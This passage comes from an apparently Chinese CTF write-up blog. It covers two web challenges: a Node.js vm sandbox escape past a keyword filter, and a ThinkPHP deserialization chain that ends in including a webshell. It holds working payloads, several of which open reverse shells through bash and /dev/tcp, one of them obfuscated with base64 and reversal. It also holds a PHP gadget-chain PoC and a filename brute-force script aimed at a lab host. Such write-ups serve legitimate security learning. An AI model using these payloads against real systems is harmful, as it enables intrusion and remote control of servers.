(e)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">message</span>);</span><br><span class="line">            <span class="built_in">require</span>(<span class="string">&#x27;./hack&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/secret&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(process.<span class="property">__filename</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(__filename, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(process.<span class="property">__filename</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">()=&gt;</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;listen on 3000&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>拿给gpt说是一个vm沙箱，那就是vm沙箱逃逸了，正常payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">     <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">         <span class="keyword">const</span> c = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">         <span class="keyword">const</span> p = (c.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return process&#x27;</span></span>))();</span><br><span class="line">         <span class="keyword">return</span> p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;) </span><br></pre></td></tr></table></figure><p>题目waf：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let pattern = /(process|<span class="string">\[.*?\]</span>|<span class="string">exec</span>|<span class="string">spawn</span>|<span class="string">Buffer</span>|<span class="string">\\</span>|<span class="string">\+</span>|<span class="string">concat</span>|<span class="string">eval</span>|<span class="string">Function)/g;</span></span><br></pre></td></tr></table></figure><p>过滤了<code>process</code>、<code>[...]</code>（方括号中的任意字符）、<code>exec</code>、<code>spawn</code>、<code>Buffer</code>、<code>\</code>（反斜杠）、<code>+</code>（加号）、<code>concat</code>、<code>eval</code>、<code>Function</code>，waf ban了中括号和加号，不能用拼接绕过；ban了eval；ban了<code>\</code>，不能用十六进制和unicode</p><h3 id="方法一：反射"><a href="#方法一：反射" class="headerlink" title="方法一：反射"></a>方法一：反射</h3><p>星盟的解：</p><p>用String.fromCharCode绕过process</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mainModule</span>.require(String.fromCharCode(<span class="number">99</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">95</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>))</span><br></pre></td></tr></table></figure><blockquote><p>上行代码使用了 <code>mainModule.require</code> 方法，并传入了一个参数，参数值是通过 <code>String.fromCharCode</code> 函数生成的字符串。该字符串实际上是 <code>&#39;child_process&#39;</code> 的字符编码，因此 <code>mainModule.require</code> 的作用是加载 Node.js 的 <code>child_process</code> 模块，故上串代码也就相当于mainModule.require(‘child_process’)</p></blockquote><p>接下来就是用Reflect.get方法绕过exec，详细文章参考：<a href="https://www.anquanke.com/post/id/237032">https://www.anquanke.com/post/id/237032</a></p><p>Reflect.get(target, propertyKey[, receiver])的作用是获取对象身上某个属性的值，类似于target[name]。所以取eval函数的方式可以变成Reflect.get(global, Reflect.ownKeys(global).find(x&#x3D;&gt;x.includes(‘eval’)))</p><blockquote><ol><li><code>Reflect.ownKeys(global)</code> 返回了全局对象 <code>global</code> 自身的所有属性的键名组成的数组。</li><li><code>Array.prototype.find()</code> 方法遍历这个数组，找到第一个符合条件的属性键名，即包含 <code>&#39;eval&#39;</code> 字符串。</li><li><code>Reflect.get(global, ...)</code> 使用找到的属性键名作为参数，从全局对象 <code>global</code> 中获取对应属性的值。</li></ol></blockquote><p>但我们本质上其实是调用的eval函数底层的exec方法，const p &#x3D; (cc.constructor.constructor(‘return global’))();获取js里面的全局函数集合</p><p><img src="https://img.picui.cn/free/2024/06/01/665b21b666e8e.png" alt="image-20240331110927064.png"></p><p>const b &#x3D; Reflect.get(p, Reflect.ownKeys(p).find(x&#x3D;&gt;x.includes(‘pro’))).mainModule.require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115));</p><blockquote><p>这段代码的目的是获取对象 <code>p</code> 中包含 <code>pro</code> 字符串的属性的值，并调用该属性值的 <code>mainModule.require()</code> 方法，传入特定的字符串<code>child_process</code>作为参数。简单来说就是调用<code>child_process</code></p></blockquote><p>最终思路：先调用集合中的键为process下面的mainModule.require(‘child_process’)的模块，Reflect.get(b, Reflect.ownKeys(b).find(x&#x3D;&gt;x.includes(‘ex’)))去找child_process底层的exec函数，再反弹shell。这道题是个无回显，怪不得当时输啥都不给我回显，输waf也不给我回显what can I say，我还以为环境出问题了😅，下次碰到就知道是无回显了</p><p>最终payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">        <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">            <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return global&#x27;</span></span>))();</span><br><span class="line">            <span class="keyword">const</span> b = <span class="title class_">Reflect</span>.<span class="title function_">get</span>(p, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(p).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;pro&#x27;</span>))).<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">99</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">95</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">Reflect</span>.<span class="title function_">get</span>(b, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(b).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;ex&#x27;</span>)))(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><h3 id="方法二：fork函数、逆序、base64、模板字母量"><a href="#方法二：fork函数、逆序、base64、模板字母量" class="headerlink" title="方法二：fork函数、逆序、base64、模板字母量"></a>方法二：fork函数、逆序、base64、模板字母量</h3><p>Z3师傅的解：</p><p>把过滤掉的关键字可以用模板字面量绕过，例如</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">child_process转成(`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)</span><br><span class="line">.execSync转成[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`]  </span><br></pre></td></tr></table></figure><p>原理：</p><p><img src="https://img.picui.cn/free/2024/06/01/665b21b676bf5.png" alt="image-20240331113204328.png"></p><p>但是中括号 [ ]被waf了，所以想到child_process下面有5个函数</p><ol><li><strong>exec</strong>: 用于执行 shell 命令。</li><li><strong>execFile</strong>: 用于执行可执行文件。</li><li><strong>spawn</strong>: 用于生成新的进程。</li><li><strong>fork</strong>: 用于衍生新的 Node.js 子进程，类似于 <code>spawn</code>，但专门用于衍生 Node.js 子进程。</li><li><strong>execSync</strong>: 是 <code>exec</code> 函数的同步版本，用于同步执行 shell 命令。</li></ol><p>只剩下fork函数了，那么思路就是在上面poc基础上，通过fs进行文件写文件，然后用fork进行加载，为了逃逸waf，可以逆序内容，然后再反序过来，写入文件后再调用fork加载达到反弹shell，由于过滤了 + ，所以 base64 编码后有 + 号的要再编码一次<br>上述字符串包含了单引号或双引号，为了避免引号冲突， content 赋值要用 反引号括起来，</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const content=` 内容 ` </span><br></pre></td></tr></table></figure><p>故最终payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line"> <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">const</span> content = <span class="string">`;)&quot;&#x27;&#125;i-,hsab&#123;|&#125;d-,46esab&#123;|&#125;d-,46esab&#123;|&#125;=0TRqp0KBRUSwo0MidXODNGc5M0YqJ1MMJjVHpldBlmSrE0UhRXQDFmeG1WW,ohce&#123;&#x27; c- hsab&quot;(cexe;)&quot;ssecorp_dlihc&quot;(eriuqer = &#125; cexe &#123; tsnoc`</span>;</span><br><span class="line"><span class="keyword">const</span> reversedContent = content.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>).<span class="title function_">reverse</span>().<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"> <span class="keyword">const</span> c = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line"> <span class="keyword">const</span> p = (c.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proces`</span>&#125;</span>s`</span>&#125;</span>`</span></span>))();</span><br><span class="line"> p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">writeFileSync</span>(<span class="string">&#x27;/tmp/test1.js&#x27;</span>, reversedContent);</span><br><span class="line">        <span class="keyword">return</span> p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>).<span class="title function_">fork</span>(<span class="string">&#x27;/tmp/test1.js&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>content的值反序输出为：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const &#123; <span class="keyword">exec</span> &#125; = <span class="keyword">require</span>(<span class="string">&quot;child_process&quot;</span>);<span class="keyword">exec</span>(<span class="string">&quot;bash -c &#x27;&#123;echo,WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M5cGNDOXdiM0owSURBK0pqRT0=&#125;|&#123;base64,-d&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M5cGNDOXdiM0owSURBK0pqRT<span class="number">0</span>=的解码为bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp/ip/port <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><p>具体分析：</p><blockquote><ol><li><code>bash -c</code> 是 Bash 命令的一种用法，其中 <code>-c</code> 选项表示后面跟着的字符串是一个命令或者是一个要执行的命令字符串。</li><li><code>&#123;base64,-d&#125;</code>：使用 <code>base64</code> 命令进行反向解码，将前一个命令的输出（经过 Base64 编码的 Bash 代码）解码为原始的 Bash 代码。</li></ol></blockquote><h3 id="方法三：replace"><a href="#方法三：replace" class="headerlink" title="方法三：replace"></a>方法三：replace</h3><p>LaoGong真的nb</p><p>因为有try，可以抛出异常来逃逸，payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">        <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">            <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return procBess&#x27;</span>.replace(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span>))();</span><br><span class="line">            <span class="keyword">const</span> obj = p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_procBess&#x27;</span>.<span class="title function_">replace</span>(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">            <span class="keyword">const</span> ex = <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyDescriptor</span>(obj, <span class="string">&#x27;exeicSync&#x27;</span>.<span class="title function_">replace</span>(<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">            <span class="keyword">return</span> ex.<span class="title function_">value</span>(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span>).<span class="title function_">toString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><h3 id="方法四：原型链污染"><a href="#方法四：原型链污染" class="headerlink" title="方法四：原型链污染"></a>方法四：原型链污染</h3><p>官方wp：</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&mid=2247485228&idx=1&sn=b72c60e839d1d35ad9867e9c194f13e5&chksm=cf5ee77af8296e6cb3335a3f6ff338fba0bcfe976feb86bc0f4f4c7d6750d2763cedaeff5eb8&mpshare=1&scene=23&srcid=0325X0enB84UIHcosRj3qfNJ&sharer_shareinfo=f330aecbcf24a75c2b304565a6580d2f&sharer_shareinfo_first=f330aecbcf24a75c2b304565a6580d2f#rd">https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&amp;mid=2247485228&amp;idx=1&amp;sn=b72c60e839d1d35ad9867e9c194f13e5&amp;chksm=cf5ee77af8296e6cb3335a3f6ff338fba0bcfe976feb86bc0f4f4c7d6750d2763cedaeff5eb8&amp;mpshare=1&amp;scene=23&amp;srcid=0325X0enB84UIHcosRj3qfNJ&amp;sharer_shareinfo=f330aecbcf24a75c2b304565a6580d2f&amp;sharer_shareinfo_first=f330aecbcf24a75c2b304565a6580d2f#rd</a></p><p><img src="https://img.picui.cn/free/2024/06/01/665b21b6859b1.png" alt="image-20240331134428015.png"></p><p>说实话这个<code>hack.js</code>不知道咋看出来的</p><p><img src="https://img.picui.cn/free/2024/06/01/665b21b685411.png" alt="image-20240331134556826.png"></p><h2 id="用过就是熟悉（tp5-0-24）"><a href="#用过就是熟悉（tp5-0-24）" class="headerlink" title="用过就是熟悉（tp5.0.24）"></a>用过就是熟悉（tp5.0.24）</h2><p>给了附件，在<code>/app/controller/user/include.class.php</code>找到入口</p><p><img src="https://img.picui.cn/free/2024/06/01/665b21b6582fa.png" alt="image-20240331175152771.png"></p><p>还给了hint：&#x3D;&#x3D;你知道tp吗？&#x3D;&#x3D;tp就是thinkphp，unserialize没啥特殊处理，所以之后就应该是<code>__wakeup</code>或者<code>__destruct</code>这两个函数其中之一了。然后全局搜索了一下，发现<code>__wakeup</code>就是输出字符，没啥用，就开始搜<code>__destruct</code>，直到看到<code>Windows.php</code>下的<code>__destruct</code></p><p><img src="https://img.picui.cn/free/2024/06/01/665b21b792e17.png" alt="image-20240331180032743.png"></p><p>到这是发现这个链子和tp5.0.24很像，可以先跟着下面链子走，走到不一样再来分析</p><p><a href="https://www.freebuf.com/articles/web/284091.html">Thinkphp5.0.24反序列化分析和poc - FreeBuf网络安全行业门户</a></p><p>跟进这个方法，发现<code>close</code>为关闭文件的方法，没有利用点，而<code>removeFiles</code>中的<code>$result = &quot;File&quot;.&quot;$filename&quot;.&quot;can&#39;t move.&quot;;</code>则是把<code>filename</code>的值当作字符串输出，正好可以触发<code>__toString</code></p><p><img src="https://img.picui.cn/free/2024/06/01/665b21b8404ec.png" alt="image-20240405103939677.png"></p><p>继续跟进到<code>Collection.php</code>下的<code>__toString</code>，其他的<code>__toString</code>没啥用就略过了</p><p><img src="https://img.picui.cn/free/2024/06/01/665b21b8e13ce.png" alt="image-20240405104957248.png"></p><p>继续跟进<code>toJson()</code>，找到<code>Collection.php</code>下的</p><p><img src="https://img.picui.cn/free/2024/06/01/665b21b98e728.png" alt="image-20240405105459179.png"></p><p>跟进到<code>Collection.php</code>下的<code>toArray()</code></p><p><img src="https://img.picui.cn/free/2024/06/01/665b21ba37566.png" alt="image-20240405105723248.png"></p><p>到这里<code>toArray()</code>有点不一样了，这里他自己实现了这个<code>toArray</code>方法，与tp5.0.24那个链子不一样，继续跟进<code>items-&gt;Loginout</code>，这里有红下划线报错，也就是说这里调用了一个不可访问的属性，可以触发<code>__get()</code></p><p><img src="https://img.picui.cn/free/2024/06/01/665b21bac4b6c.png" alt="image-20240405111049999.png"></p><p>可以触发<code>View.php</code>下的<code>__get()</code></p><p><img src="https://img.picui.cn/free/2024/06/01/665b21bb5f60a.png" alt="image-20240405111448514.png"></p><p>而这里Loginsubmit()找不到了，也就是说可以实现调用不可访问的函数，这时找到两个<code>__call</code>，先用<code>Testone.php</code>下的<code>__call()</code>获取hint再说</p><p><img src="https://img.picui.cn/free/2024/06/01/665b21bbf2694.png" alt="image-20240405155500311.png"></p><p>我们注意到文件名是以时间戳的md5以后重新生成的，那么我们不断发包爆破即可，但要调用到这个函数，就要先写poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="comment">//namespace think\process\pipes; 表示当前文件中的类所属的命名空间是 think\process\pipes。</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Collection</span>;</span><br><span class="line"><span class="comment">//use think\Collection; 的作用是将 think\Collection 类引入到当前命名空间，以便在 Windows 类中直接使用 Collection 类而不需要写完整的命名空间路径。</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;  </span><br><span class="line"><span class="comment">//因为我们需要windows，然后windows又继承的是Pipes，所以我们需要写进来</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];<span class="comment">//这里files要为数组，因为原文件是这样写的</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Collection</span>()];<span class="comment">//触发Model __toString(),子类Pivot合适</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Collection</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$items</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;items=<span class="keyword">new</span> <span class="title class_">View</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Testone</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">////抽象类是不能实例化的，需要找到他的子类，即下面的Debug类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Debug</span> <span class="keyword">extends</span> <span class="title">Testone</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">View</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$engine</span>=<span class="keyword">array</span>(<span class="string">&quot;time&quot;</span>=&gt;<span class="string">&quot;10086&quot;</span>);</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="string">&#x27;Loginout&#x27;</span>]=<span class="keyword">new</span> <span class="title class_">Debug</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure><p>bp抓包看看登陆请求的格式</p><p><img src="https://img.picui.cn/free/2024/06/01/665b21bc923af.png" alt="image-20240406160254664.png"></p><p>照着格式发包写脚本爆破文件名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> <span class="type">time</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://192.168.111.128:32769/?user/index/loginSubmit&quot;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;name&quot;: &quot;guest&quot;,</span><br><span class="line">    &quot;password&quot;: &quot;TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE2OiJ0aGlua1xDb2xsZWN0aW9uIjoxOntzOjg6IgAqAGl0ZW1zIjtPOjEwOiJ0aGlua1xWaWV3IjoyOntzOjc6IgAqAGRhdGEiO2E6MTp7czo4OiJMb2dpbm91dCI7TzoxMToidGhpbmtcRGVidWciOjA6e319czo2OiJlbmdpbmUiO2E6MTp7czo0OiJ0aW1lIjtzOjU6IjEwMDg2Ijt9fX19fQ==&quot;,</span><br><span class="line">    &quot;rememberPassword&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;salt&quot;: &quot;1&quot;,</span><br><span class="line">    &quot;CSRF_TOKEN&quot;: &quot;NAsttPjzKH4RbiNA&quot;,</span><br><span class="line">    &quot;API_ROUTE&quot;: &quot;user/index/loginSubmit&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="type">time</span> = <span class="type">int</span>(<span class="type">time</span>.time())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="type">time</span> - <span class="number">100</span>, <span class="type">time</span> + <span class="number">100</span>):</span><br><span class="line">    md5 = hashlib.md5(str(i).encode()).hexdigest()</span><br><span class="line">    _url = &quot;http://192.168.111.128:32769/app/controller/user/think/&quot; + str(md5)</span><br><span class="line">    res = requests.<span class="keyword">get</span>(url=_url)</span><br><span class="line">    # print(res.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;可道&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(md5)</span><br><span class="line">        print(res.text)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><p>得到hint文件，关键信息</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">我曾听说，密码的明文，加上心爱之人的名字<span class="comment">(Chu0)</span>，就能够听到游客的心声。</span><br></pre></td></tr></table></figure><p>说明guest的密码就是明文＋Chu0，可以在本地调试获取，在<code>index.class.php</code>中找到</p><p><img src="https://img.picui.cn/free/2024/06/01/665b21bd2e38f.png" alt="image-20240406164758968.png"></p><p>调用了<code>Mcrypt.class.php</code>解密，本地调试</p><p><img src="https://img.picui.cn/free/2024/06/01/665b21bdc15c0.png" alt="image-20240406170140496.png"></p><p>得到!@!@!@!@NKCTF，最后密码为：!@!@!@!@NKCTFChu0</p><p>也可以在db.sql数据库直接找到密码</p><p><img src="https://img.picui.cn/free/2024/06/01/665b21be66cd2.png" alt="屏幕截图 2024-04-06 165859.png"></p><p>登录后在回收站找到一个一句话木马，直接用不行，这时就用到之前两个<code>__call</code>中的另外一个了，是个文件包含，包含刚才找的的一句话木马就行</p><p><img src="https://img.picui.cn/free/2024/06/01/665b21bf05a8b.png" alt="image-20240406170910403.png"></p><p>稍微改下poc即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span 